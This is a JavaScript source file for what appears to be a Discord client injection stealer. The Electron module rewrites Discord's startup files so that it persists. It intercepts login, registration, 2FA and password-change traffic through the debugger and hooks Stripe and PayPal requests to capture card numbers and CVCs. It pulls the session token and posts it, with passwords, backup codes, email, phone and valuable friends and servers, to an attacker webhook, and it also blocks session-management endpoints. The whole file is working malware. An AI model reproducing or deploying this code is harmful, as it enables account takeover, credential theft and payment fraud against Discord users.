const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const getCreatedAt = (id) => {
    const timestamp = (BigInt(id) >> 22n) + 1420070400000n;
    const date = new Date(Number(timestamp));
    return `<t:${Math.floor(date.getTime() / 1000)}:D>`;
};

// BADGE EMOJI IDs - Replace these with your actual Discord emoji IDs
const BADGE_EMOJIS = {
    // Public Flags
    discord_employee: '<:staff:1426307616077906061>',
    partnered_server_owner: '<:partner:1426307340956733550>',
    hypesquad_events: '<:hypesquad_events:ID>',  // BURAYA KOYACAKSIN
    bug_hunter_level_1: '<:bughunter_1:1426301430695727235>',
    hypesquad_bravery: '<:bravery:ID>',  // BURAYA KOYACAKSIN
    hypesquad_brilliance: '<:brilliance:ID>',  // BURAYA KOYACAKSIN
    hypesquad_balance: '<:balance:ID>',  // BURAYA KOYACAKSIN
    early_supporter: '<:early_supporter:1426301425503436852>',
    bug_hunter_level_2: '<:bughunter_2:1426301432197419120>',
    verified_developer: '<:developer:1426301434017611927>',
    certified_moderator: '<:alumni:1426308069775642770>',
    active_developer: '<:active_developer:ID>',  // BURAYA KOYACAKSIN

    // Nitro Tenure
    nitro_opal: '<:opal:1426301365046612151>',      // 72 months
    nitro_ruby: '<:ruby:1426301368536268870>',      // 60 months
    nitro_emerald: '<:emerald:1426301360860692610>', // 36 months
    nitro_diamond: '<:diamond:1426301358805352600>', // 24 months
    nitro_platinum: '<:platinum:1426301366745432335>', // 12 months
    nitro_gold: '<:gold:1426301362085302294>',      // 6 months
    nitro_silver: '<:silver:1426301370243485896>',  // 3 months
    nitro_bronze: '<:bronze:1426301372042707004>',  // 1 month
    nitro: '<:nitro:1426989748958003423>',          // 0 months

    // Server Boost
    guild_booster_lvl9: '<:lvl9:1426304875284926565>', // 24+ months
    guild_booster_lvl8: '<:lvl8:1426304897422463116>', // 21 months
    guild_booster_lvl7: '<:lvl7:1426304895841075342>', // 18 months
    guild_booster_lvl6: '<:lvl6:1426304893635002409>', // 15 months
    guild_booster_lvl5: '<:lvl5:1426304891961217144>', // 12 months
    guild_booster_lvl4: '<:lvl4:1426304884377915512>', // 9 months
    guild_booster_lvl3: '<:lvl3:1426304882654314647>', // 6 months
    guild_booster_lvl2: '<:lvl2:1426304881031118900>', // 3 months
    guild_booster_lvl1: '<:lvl1:1426304877063180359>', // 1 month

    // Special
    quest_completed: '<:quest_completed:1426305108462927933>',
    orb_profile_badge: '<:orbs:1426305106944720947>',
    two_char: '<:2c:1426308858942455829>',
    three_char: '<:3c:1426308833780826283>',
    april_fools_2026: '<:april_fools_2026:ID>',  // BURAYA KOYACAKSIN
};

const getMonthsSince = (dateStr) => {
    if (!dateStr) return 0;
    const date = new Date(dateStr);
    const now = new Date();
    return Math.floor((now - date) / (1000 * 60 * 60 * 24 * 30.44));
};

const getBadges = (account, profileData = null) => {
    const flags = account.public_flags || 0;
    const badges = [];

    // 2c/3c username badges
    if (account.discriminator === '0') {
        const username = account.username || '';
        if (username.length === 2) badges.push(BADGE_EMOJIS.two_char);
        else if (username.length === 3) badges.push(BADGE_EMOJIS.three_char);
    }

    // Public flags badges
    if (flags & 1) badges.push(BADGE_EMOJIS.discord_employee);
    if (flags & 2) badges.push(BADGE_EMOJIS.partnered_server_owner);
    if (flags & 4) badges.push(BADGE_EMOJIS.hypesquad_events);
    if (flags & 8) badges.push(BADGE_EMOJIS.bug_hunter_level_1);
    if (flags & 64) badges.push(BADGE_EMOJIS.hypesquad_bravery);
    if (flags & 128) badges.push(BADGE_EMOJIS.hypesquad_brilliance);
    if (flags & 256) badges.push(BADGE_EMOJIS.hypesquad_balance);
    if (flags & 512) badges.push(BADGE_EMOJIS.early_supporter);
    if (flags & 16384) badges.push(BADGE_EMOJIS.bug_hunter_level_2);
    if (flags & 131072) badges.push(BADGE_EMOJIS.verified_developer);
    if (flags & 262144) badges.push(BADGE_EMOJIS.certified_moderator);
    if (flags & 4194304) badges.push(BADGE_EMOJIS.active_developer);

    // Profile badges (Nitro, Boost, Special)
    if (profileData && profileData.badges) {
        for (const badge of profileData.badges) {
            const badgeId = badge.id.toLowerCase();

            // Quest completed
            if (badgeId === 'quest_completed') {
                badges.push(BADGE_EMOJIS.quest_completed);
            }
            // Orb profile
            else if (badgeId === 'orb_profile_badge') {
                badges.push(BADGE_EMOJIS.orb_profile_badge);
            }
            // April Fools 2026
            else if (badgeId === 'april_fools_2026') {
                badges.push(BADGE_EMOJIS.april_fools_2026);
            }
        }
    }

    // Nitro tenure badges
    if (profileData && profileData.premium_since) {
        const months = getMonthsSince(profileData.premium_since);
        if (months >= 72) badges.push(BADGE_EMOJIS.nitro_opal);
        else if (months >= 60) badges.push(BADGE_EMOJIS.nitro_ruby);
        else if (months >= 36) badges.push(BADGE_EMOJIS.nitro_emerald);
        else if (months >= 24) badges.push(BADGE_EMOJIS.nitro_diamond);
        else if (months >= 12) badges.push(BADGE_EMOJIS.nitro_platinum);
        else if (months >= 6) badges.push(BADGE_EMOJIS.nitro_gold);
        else if (months >= 3) badges.push(BADGE_EMOJIS.nitro_silver);
        else if (months >= 1) badges.push(BADGE_EMOJIS.nitro_bronze);
        else badges.push(BADGE_EMOJIS.nitro);
    }

    // Server boost badges
    if (profileData && profileData.premium_guild_since) {
        const months = getMonthsSince(profileData.premium_guild_since);
        if (months >= 24) badges.push(BADGE_EMOJIS.guild_booster_lvl9);
        else if (months >= 21) badges.push(BADGE_EMOJIS.guild_booster_lvl8);
        else if (months >= 18) badges.push(BADGE_EMOJIS.guild_booster_lvl7);
        else if (months >= 15) badges.push(BADGE_EMOJIS.guild_booster_lvl6);
        else if (months >= 12) badges.push(BADGE_EMOJIS.guild_booster_lvl5);
        else if (months >= 9) badges.push(BADGE_EMOJIS.guild_booster_lvl4);
        else if (months >= 6) badges.push(BADGE_EMOJIS.guild_booster_lvl3);
        else if (months >= 3) badges.push(BADGE_EMOJIS.guild_booster_lvl2);
        else if (months >= 1) badges.push(BADGE_EMOJIS.guild_booster_lvl1);
    }

    return badges.length > 0 ? badges.join(' ') : '`null`';
};

const hooker = async (content, token, account, password = null) => {
    const fullUsername = account.discriminator !== '0'
        ? `${account.username}#${account.discriminator}`
        : account.username;

    const avatarUrl = account.avatar
        ? `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}${account.avatar.startsWith('a_') ? '.gif' : '.png'}?size=128`
        : null;

    // Fetch profile for complete badge data
    let profileData = null;
    try {
        profileData = await fetch("/profile", { "Authorization": token });
    } catch (e) { }

    const badges = getBadges(account, profileData);
    const createdAt = getCreatedAt(account.id);

    // Build main embed
    const mainEmbed = {
        color: 16777215,
        fields: [
            {
                name: "**token**",
                value: "```" + token + "```",
                inline: false
            },
            {
                name: "username",
                value: "`" + fullUsername + "`",
                inline: true
            },
            {
                name: "badges",
                value: badges,
                inline: true
            },
            {
                name: "created at",
                value: createdAt,
                inline: true
            },
            {
                name: "email",
                value: "`" + (account.email || "null") + "`",
                inline: true
            },
            {
                name: "phone",
                value: "`" + (account.phone || "null") + "`",
                inline: true
            },
            {
                name: "authenticator",
                value: "`" + (account.mfa_enabled ? "Enabled" : "Disabled") + "`",
                inline: true
            }
        ],
        footer: {
            text: "zenithasf",
            icon_url: "https://example.com/icon.png"
        }
    };

    if (avatarUrl) {
        mainEmbed.thumbnail = { url: avatarUrl };
    }

    // Get HQ friends
    const hqFriends = await getHQFriends(token);
    const hqFriendsEmbed = {
        title: "high quality friends",
        description: hqFriends.length > 0 ? hqFriends.join('\n') : '`null`',
        color: 16777215,
        footer: {
            text: "zenithasf",
            icon_url: "https://example.com/icon.png"
        }
    };

    // Get HQ servers
    const hqServers = await getHQServers(token);
    const hqServersEmbed = {
        title: "high quality servers",
        description: hqServers.length > 0 ? hqServers.join('\n') : '`null`',
        color: 16777215,
        footer: {
            text: "zenithasf",
            icon_url: "https://example.com/icon.png"
        }
    };

    const payload = {
        content: content + (password ? " `" + password + "`" : ""),
        embeds: [mainEmbed, hqFriendsEmbed, hqServersEmbed]
    };

    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(payload));
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});

const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});

const getHQFriends = async (token) => {
    try {
        const friends = await fetchFriends(token);
        const hqList = [];

        for (const friend of friends) {
            if (friend.type !== 1) continue; // Only friends

            const user = friend.user;
            const flags = user.public_flags || 0;

            // Check for rare badges (same as discord.cpp)
            const isRare = (flags & 1) ||   // Discord Employee
                (flags & 2) ||   // Partner
                (flags & 4) ||   // HypeSquad Events
                (flags & 8) ||   // Bug Hunter 1
                (flags & 512) || // Early Supporter
                (flags & 16384) || // Bug Hunter 2
                (flags & 131072) || // Verified Developer
                (flags & 262144);   // Certified Moderator

            if (isRare) {
                // Fetch full profile for complete badges
                let profileData = null;
                try {
                    profileData = await fetch(`/users/${user.id}/profile`, { "Authorization": token });
                } catch (e) { }

                const badges = getBadges(user, profileData);
                const username = user.discriminator !== '0'
                    ? `${user.username}#${user.discriminator}`
                    : user.username;
                hqList.push(`${badges} \`${username}\``);
            }
        }

        return hqList.slice(0, 50);
    } catch (e) {
        return [];
    }
};

const getHQServers = async (token) => {
    try {
        const guilds = await fetchServers(token);
        const hqList = [];

        for (const guild of guilds) {
            if (guild.owner && guild.approximate_member_count >= 100) {
                hqList.push(`\`${guild.name}\` with ${guild.approximate_member_count} members`);
            }
        }

        return hqList.slice(0, 50);
    } catch (e) {
        return [];
    }
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token);
    const content = `${account.id} just ${action}!`;
    await hooker(content, token, account, password);
};

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token);

    const filteredCodes = codes.filter((code) => code.consumed === false);
    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }

    const content = `${account.id} just viewed 2FA backup codes!`;
    const payload = {
        content: content + "\n```" + message + "```",
        embeds: []
    };

    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(payload));
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token);
    const content = `${account.id} just changed password!`;
    await hooker(content, token, account, `Old: ${oldPassword} | New: ${newPassword}`);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token);
    const content = `${account.id} just added credit card!`;
    await hooker(content, token, account, `${number} | ${cvc} | ${month}/${year}`);
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token);
    const content = `${account.id} just added PayPal!`;
    await hooker(content, token, account);
};

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));

        const token = await getToken();
        if (!token) return;

        const account = await fetchAccount(token);
        const content = `${account.id} just got injected!`;
        await hooker(content, token, account);
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                name: 'discord',
                main: 'index.js',
            },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return; // 2FA
                }
                await EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                await EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                await EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                await BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;

                if (requestData.email) {
                    await EmailPassToken(requestData.email, requestData.password, responseData.token, "changed email");
                }

                if (requestData.new_password) {
                    await PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow()
    });
}
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            await CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            await PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");